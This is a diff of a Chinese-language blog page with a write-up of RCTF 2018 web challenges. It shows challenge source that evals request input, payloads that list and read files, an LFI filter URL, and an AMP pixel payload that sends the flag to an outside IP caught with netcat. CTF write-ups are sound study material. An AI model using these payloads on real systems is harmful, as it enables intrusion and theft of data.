@@ -19,8 +19,8 @@
     <!-- 设置密码 -->
     <script>
         (function(){
-            if('{{ page.password }}'){
-                if (prompt('请输入文章密码','') !== '{{ page.password }}'){
+            if(''){
+                if (prompt('请输入文章密码','') !== ''){
                     alert('密码错误！');
                     history.back();
                 }
@@ -402,7 +402,7 @@
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$token = sha1($_SERVER[&apos;REMOTE_ADDR&apos;]);</span><br><span class="line">$dir = &apos;../sandbox/&apos;.$token.&apos;/&apos;;</span><br><span class="line">is_dir($dir) ?: mkdir($dir);</span><br><span class="line">is_file($dir.&apos;index.php&apos;) ?: file_put_contents($dir.&apos;index.php&apos;, str_replace(&apos;#SHA1#&apos;, $token, file_get_contents(&apos;./template&apos;)));</span><br><span class="line">switch($_GET[&apos;action&apos;] ?: &apos;&apos;)&#123;</span><br><span class="line">    case &apos;go&apos;:</span><br><span class="line">        header(&apos;Location: http://&apos;.$token.&apos;.sandbox.r-cursive.ml:1337/&apos;);</span><br><span class="line">        break;</span><br><span class="line">    case &apos;reset&apos;:</span><br><span class="line">        system(&apos;rm -rf &apos;.$dir);</span><br><span class="line">        break;</span><br><span class="line">    default:</span><br><span class="line">        show_source(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;style&gt;code&#123;font-family: Segoe Script, Brush Script MT, cursive; font-size: 1.337em;&#125;&lt;/style&gt;</span><br></pre></td></tr></table></figure>
 <p>template:</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">sha1($_SERVER[&apos;REMOTE_ADDR&apos;]) === &apos;#SHA1#&apos; ?: die();</span><br><span class="line">&apos;;&apos; === preg_replace(&apos;/[^\W_]+\((?R)?\)/&apos;, NULL, $_GET[&apos;cmd&apos;]) ? eval($_GET[&apos;cmd&apos;]) : show_source(__FILE__);</span><br></pre></td></tr></table></figure>
-<p><a href="http://589bf872527b686d94b4448c8ea3aed4761eaddc.sandbox.r-cursive.ml:1337/" target="_blank" rel="external nofollow noopener noreferrer">http://589bf872527b686d94b4448c8ea3aed4761eaddc.sandbox.r-cursive.ml:1337/</a>:</p>
+<p><a href="http://589bf872527b686d94b4448c8ea3aed4761eaddc.sandbox.r-cursive.ml:1337/" rel="external nofollow" target="_blank">http://589bf872527b686d94b4448c8ea3aed4761eaddc.sandbox.r-cursive.ml:1337/</a>:</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">sha1($_SERVER[&apos;REMOTE_ADDR&apos;]) === &apos;589bf872527b686d94b4448c8ea3aed4761eaddc&apos; ?: die();</span><br><span class="line">&apos;;&apos; === preg_replace(&apos;/[^\W_]+\((?R)?\)/&apos;, NULL, $_GET[&apos;cmd&apos;]) ? eval($_GET[&apos;cmd&apos;]) : show_source(__FILE__);</span><br></pre></td></tr></table></figure>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?cmd=print(readdir(opendir(getcwd()))); 可以列目录</span><br><span class="line">?cmd=print(readfile(readdir(opendir(getcwd())))); 读文件</span><br><span class="line">?cmd=print(dirname(dirname(getcwd()))); print出/var/www</span><br></pre></td></tr></table></figure>
 <p>翻阅文档找到<code>getallheaders()</code>函数，会返回所有的http请求头，因为header可控，所以可执行任意命令了<br>?cmd=print(end(getallheaders()));</p>
@@ -425,8 +425,8 @@
 <h2 id="Backdoor"><a href="#Backdoor" class="headerlink" title="Backdoor"></a>Backdoor</h2><p><img src="/images/rctf/1526992722365.png" alt="1526992722365"></p>
 <p>根据contrab.sh,我们可以得到两个链接：</p>
 <blockquote>
-<p><a href="http://backdoor.2018.teamrois.cn/post.php?action=upload" target="_blank" rel="external nofollow noopener noreferrer">http://backdoor.2018.teamrois.cn/post.php?action=upload</a></p>
-<p><a href="http://backdoor.2018.teamrois.cn/post.php?action=debugging&amp;count=$debuggers" target="_blank" rel="external nofollow noopener noreferrer">http://backdoor.2018.teamrois.cn/post.php?action=debugging&amp;count=$debuggers</a></p>
+<p><a href="http://backdoor.2018.teamrois.cn/post.php?action=upload" rel="external nofollow" target="_blank">http://backdoor.2018.teamrois.cn/post.php?action=upload</a></p>
+<p><a href="http://backdoor.2018.teamrois.cn/post.php?action=debugging&amp;count=$debuggers" rel="external nofollow" target="_blank">http://backdoor.2018.teamrois.cn/post.php?action=debugging&amp;count=$debuggers</a></p>
 </blockquote>
 <p>打开首页，查看源码，得到aaencode之后的js代码:</p>
 <p>解密网址:<code>https://tool.zcmzcm.org/aadecode</code></p>
@@ -435,7 +435,7 @@
 <p>查看post.php，发现可能存在LFI。</p>
 <p>index.php,没啥用</p>
 <blockquote>
-<p><a href="http://backdoor.2018.teamrois.cn/post.php?action=php://filter/read=convert.base64-encode/resource=index" target="_blank" rel="external nofollow noopener noreferrer">http://backdoor.2018.teamrois.cn/post.php?action=php://filter/read=convert.base64-encode/resource=index</a></p>
+<p><a href="http://backdoor.2018.teamrois.cn/post.php?action=php://filter/read=convert.base64-encode/resource=index" rel="external nofollow" target="_blank">http://backdoor.2018.teamrois.cn/post.php?action=php://filter/read=convert.base64-encode/resource=index</a></p>
 </blockquote>
 <p>post.php</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">include $_GET[&apos;action&apos;] . &apos;.php&apos;;</span><br></pre></td></tr></table></figure>
@@ -461,12 +461,12 @@
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">115.159.200.107 - - [22/May/2018:21:39:02 +0800] &quot;GET /?flag=RCTF&#123;why_the_heck_no_mimetype_for_webp_in_apache2_in_8012&#125;;%20hint_for_rBlog_Rev.2=http://rblog.2018.teamrois.cn/blog.php/52c533a30d8129ee4915191c57965ef4c7718e6d HTTP/1.1&quot; 200 15 &quot;http://rblog.2018.teamrois.cn/&quot; &quot;Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/66.0.3359.181 Safari/537.36&quot;</span><br></pre></td></tr></table></figure>
 <h2 id="amp"><a href="#amp" class="headerlink" title="amp"></a>amp</h2><p>payload:</p>
 <blockquote>
-<p><a href="http://amp.2018.teamrois.cn?name=" target="_blank" rel="external nofollow noopener noreferrer">http://amp.2018.teamrois.cn?name=</a><amp-pixel src="https://123.207.90.143:1234/pixel?clientId=CLIENT_ID(FLAG)"></amp-pixel></p>
+<p><a href="http://amp.2018.teamrois.cn?name=" rel="external nofollow" target="_blank">http://amp.2018.teamrois.cn?name=</a><amp-pixel src="https://123.207.90.143:1234/pixel?clientId=CLIENT_ID(FLAG)"></amp-pixel></p>
 </blockquote>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">[root@VM_89_224_redhat ~]# nc -lvv 1234</span><br><span class="line">Ncat: Version 6.40 ( http://nmap.org/ncat )</span><br><span class="line">Ncat: Listening on :::1234</span><br><span class="line">Ncat: Listening on 0.0.0.0:1234</span><br><span class="line">Ncat: Connection from 106.120.206.166.</span><br><span class="line">Ncat: Connection from 106.120.206.166:64053.</span><br><span class="line">��Y���8۲Y�=����6���km����</span><br><span class="line">                                 ��A It+z���^�vY�$���,�3�&apos;�����*K�Zp&quot;jj�+�/�,�0̨̩����/5</span><br><span class="line"></span><br><span class="line">              hhttp/1.1uP</span><br><span class="line">                          3+)jj �ZaV&gt;WB�~���|�Z��4KM�������Et~-+</span><br><span class="line"></span><br><span class="line">��</span><br></pre></td></tr></table></figure>
 <p>writeup:</p>
 <blockquote>
-<p> <a href="https://github.com/zsxsoft/my-rctf-2018/tree/master/amp" target="_blank" rel="external nofollow noopener noreferrer">https://github.com/zsxsoft/my-rctf-2018/tree/master/amp</a></p>
+<p> <a href="https://github.com/zsxsoft/my-rctf-2018/tree/master/amp" rel="external nofollow" target="_blank">https://github.com/zsxsoft/my-rctf-2018/tree/master/amp</a></p>
 </blockquote>
 <p>注意，我这里是乱码的原因是，我直接监听1234端口，并不支持ssl。</p>
 
@@ -477,7 +477,7 @@
             <p>原文作者: <a href="http://fengyuhetao.github.io">Tianji</a>
             </p><p>原文链接: <a href="http://fengyuhetao.github.io/posts/9764/">http://fengyuhetao.github.io/posts/9764/</a>
             </p><p>发表日期: <a href="http://fengyuhetao.github.io/posts/9764/">May 22nd 2018, 2:35:41 pm</a>
-            </p><p>版权声明: 本文采用<a rel="external nofollow noopener noreferrer" href="http://creativecommons.org/licenses/by-nc/4.0/" target="_blank">知识共享署名-非商业性使用 4.0 国际许可协议</a>进行许可</p>
+            </p><p>版权声明: 本文采用<a rel="external nofollow" href="http://creativecommons.org/licenses/by-nc/4.0/" target="_blank">知识共享署名-非商业性使用 4.0 国际许可协议</a>进行许可</p>
         </div>
     
     <!-- paginator  -->
@@ -485,16 +485,16 @@
         <li class="next">
             
                 <div class="nextSlogan">Next Post</div>
-                <a href="/posts/26365/" title="suctf2018">
-                    <div class="nextTitle">suctf2018</div>
+                <a href="/posts/23527/" title="phpinfo解读">
+                    <div class="nextTitle">phpinfo解读</div>
                 </a>
             
         </li>
         <li class="previous">
             
                 <div class="prevSlogan">Previous Post</div>
-                <a href="/posts/23527/" title="phpinfo解读">
-                    <div class="prevTitle">phpinfo解读</div>
+                <a href="/posts/32791/" title="bypassaslr_1">
+                    <div class="prevTitle">bypassaslr_1</div>
                 </a>
             
         </li>
@@ -526,7 +526,7 @@
     
         
             
-                <a href="mailto:fengyunhetao@gmail.com" class="iconfont-archer email" title="email" rel="external nofollow noopener noreferrer" target="_blank"></a>
+                <a href="mailto:fengyunhetao@gmail.com" class="iconfont-archer email" title="email" rel="external nofollow" target="_blank"></a>
             
         
     
@@ -580,7 +580,7 @@
     
     <!-- powered by Hexo  -->
     <div class="copyright">
-        <span id="hexo-power">Powered by <a href="https://hexo.io/" target="_blank" rel="external nofollow noopener noreferrer">Hexo</a></span><span class="iconfont-archer power">&#xe635;</span><span id="theme-info">theme <a href="https://github.com/fi3ework/hexo-theme-archer" target="_blank" rel="external nofollow noopener noreferrer">Archer</a></span>
+        <span id="hexo-power">Powered by <a href="https://hexo.io/" target="_blank" rel="external nofollow">Hexo</a></span><span class="iconfont-archer power">&#xe635;</span><span id="theme-info">theme <a href="https://github.com/fi3ework/hexo-theme-archer" target="_blank" rel="external nofollow">Archer</a></span>
     </div>
     <!-- 不蒜子  -->
     
@@ -612,42 +612,6 @@
     <div class="sidebar-content sidebar-content-show-archive">
           <div class="sidebar-panel-archives">
     <!-- 在ejs中将archive按照时间排序 -->
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
     
     
     
@@ -1332,12 +1296,12 @@
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">06/08</span><a class="archive-post-title" href="/posts/5359/">sqlmap使用</a>
+            <span class="archive-post-date">06/08</span><a class="archive-post-title" href="/posts/29112/">pwn前置知识</a>
         </li>
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">06/08</span><a class="archive-post-title" href="/posts/29112/">pwn前置知识</a>
+            <span class="archive-post-date">06/08</span><a class="archive-post-title" href="/posts/5359/">sqlmap使用</a>
         </li>
     
     
